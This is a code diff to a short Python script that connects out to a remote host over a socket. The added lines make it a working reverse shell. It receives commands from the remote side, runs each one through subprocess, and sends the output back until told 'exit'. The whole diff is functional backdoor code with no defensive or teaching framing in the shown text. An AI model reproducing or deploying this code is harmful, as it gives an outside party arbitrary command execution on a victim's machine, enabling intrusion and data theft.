@@ -1,4 +1,5 @@
 import socket
+import subprocess
 
 #Create socket
 s=socket.socket()
@@ -15,3 +16,10 @@ s.connect((CLIENT_IP, PORT))
 while True:
 
     command2Execute = s.recv(1024).decode()
+    #end connection
+    if command2Execute.lower() == "exit":
+        break
+    commandResults = subprocess.getoutput(command2Execute)
+    s.send(commandResults.encode())
+#End connection to server
+s.close()
